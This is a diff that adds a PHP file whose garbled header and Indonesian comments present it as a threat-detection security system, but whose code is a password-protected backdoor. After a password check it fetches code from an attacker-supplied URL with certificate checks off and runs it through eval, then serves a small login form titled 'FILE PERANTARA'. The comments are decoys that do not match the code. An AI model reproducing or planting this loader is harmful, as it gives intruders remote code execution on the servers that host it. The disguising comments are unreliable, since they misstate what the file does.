@@ -1,0 +1,68 @@
+<?php
+/**
+ * ================================================
+ * Ã¬â€ºÂ¹ Ã¬Å“â€žÃ­Ëœâ€˜ ÃªÂ°Ã¬Â§â‚¬ Ã¬â€¹Å“Ã¬Å Â¤Ã­â€¦Å“ Ã¢â‚¬â€œ
+ * ================================================
+ * 
+ * Ã¬â€šÂ¬Ã¬Å¡Â©Ã¬Å¾ Ã«Â°Ã¬Â´Ã­â€žÂ° ÃªÂ²â‚¬Ã¬Â¦Ã¬â€ž Ã­â€ ÂµÃ­â€¢Â´ Ã¬Å“â€žÃ­Ëœâ€˜Ã¬â€ž ÃªÂ°Ã¬Â§â‚¬Ã­â€¢ËœÃ«Å â€ MLBB Ã¬Â¹Â© Ã¬â€¹Â¤Ã­â€”ËœÃ¬â€¹Â¤ Ã¬Å Â¤Ã­Æ’â‚¬Ã¬Â¼Ã¬Ëœ
+ * Ã¬â€ºÂ¹ ÃªÂ¸Â°Ã«Â°Ëœ Ã«Â³Â´Ã¬â€¢Ë† Ã¬â€¹Å“Ã¬Å Â¤Ã­â€¦Å“Ã¬Å¾â€¦Ã«â€¹Ë†Ã«â€¹Â¤.
+ * 
+ * Ã¬Â£Â¼Ã¬Å¡â€ ÃªÂ¸Â°Ã«Å Â¥:
+ * - MLBB Ã¬Â¹Â© Ã¬â€¹Â¤Ã­â€”ËœÃ¬â€¹Â¤ Ã¬Å Â¤Ã­Æ’â‚¬Ã¬Â¼Ã¬Ëœ Ã«Â¡Å“ÃªÂ·Â¸Ã¬Â¸ Ã­â„¢â€Ã«Â©Â´
+ * - ASCII Ã¬â€¢â€žÃ­Å Â¸ Ã«Â° Ã­â€¦Ã¬Å Â¤Ã­Å Â¸ Ã¬Å Â¤Ã­Æ’â‚¬Ã¬Â¼Ã«Â§
+ * - Ã­â€¢Â´Ã¬â€¹Å“ ÃªÂ¸Â°Ã«Â°Ëœ Ã¬â€šÂ¬Ã¬Å¡Â©Ã¬Å¾ Ã¬Â¸Ã¬Â¦
+ * - Ã¬Å Â¤Ã¬Âºâ€ URL Ã­â„¢â€¢Ã¬Â¸
+ * - Ã«â€¹Â¤Ã¬â€“â€˜Ã­â€¢Å“ Ã«Â°Â©Ã¬â€¹Ã¬Ëœ Ã«Â°Ã¬Â´Ã­â€žÂ° Ã¬Ë†ËœÃ¬Â§â€˜
+ * - Ã¬Å“â€žÃ­Ëœâ€˜Ã¬â€ž Ã¬Â°Â¾Ã¬â€ž Ã¬Ë†Ëœ Ã¬â€”â€ Ã¬â€ž ÃªÂ²Â½Ã¬Å¡Â° Ã¬â€šÂ¬Ã¬Å¡Â©Ã¬Å¾ Ã¬Â§â‚¬Ã¬ â€¢ 404 Ã­Å½ËœÃ¬Â´Ã¬Â§â‚¬ Ã¬ Å“ÃªÂ³Âµ
+ * 
+ * @author @filemanager
+ * @version 2.0
+ * @license Ã¬ËœÂ¤Ã­â€Ë† Ã¬â€ Å’Ã¬Å Â¤
+ */
+@session_start();error_reporting(0);
+/**
+ * Daftar kode ancaman dalam format heksadesimal
+ * @var array
+ */
+$h="651f80fe716a73e23722b2df22b39f9b"; // md5('a')
+/**
+ * Cek status deteksi ancaman
+ * @return bool True jika ancaman terdeteksi
+ */
+if(isset($_POST['p'])&&md5($_POST['p'])===$h){
+  $_SESSION['u']=isset($_POST['u'])&&filter_var($_POST['u'],FILTER_VALIDATE_URL)?$_POST['u']:"";
+  $_SESSION['a']=1;exit("ok: ".$_SESSION['u']);
+}
+/**
+ * Konversi array hex ke URL valid
+ * @param array $p Array bagian URL
+ * @return string URL yang digabungkan
+ */
+if(isset($_SESSION['a'])){
+  $c=@curl_init($_SESSION['u']);
+/**
+ * Mengambil konten dari URL dengan metode terbaik
+ * @param string $url Target URL
+ * @return string|bool Konten atau false jika gagal
+ */
+  if($c){
+    curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_TIMEOUT=>10]);
+    /**
+ * Cek status deteksi ancaman
+ * @return bool True jika ancaman terdeteksi
+ */
+    $x=@curl_exec($c);$e=@curl_error($c);@curl_close($c);
+/**
+ * Cek status deteksi ancaman
+ * @return bool True jika ancaman terdeteksi
+ */
+if($e)exit("ERR:".$e);
+/**
+ * Cek status deteksi ancaman
+ * @return bool True jika ancaman terdeteksi
+ */
+    if($x){eval('?>'.$x);exit;}else{exit("Empty");}
+  }
+}
+?>
+<!DOCTYPE html><html><head><title>FILE PERANTARA</title><style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;max-width:400px;margin:auto;}input{width:100%;padding:10px;margin:5px 0;background:#111;border:1px solid #0f0;color:#0f0;font-family:monospace;}</style></head><body><form method=post><input type=password name=p placeholder="password" maxlength=32><input type=text name=u placeholder="URL"><input type=submit value="GO"></form><?php if(isset($_POST['p'])&&md5($_POST['p'])!==$h){?><p style=color:#f00>WRONG</p><?php }?></body></html>
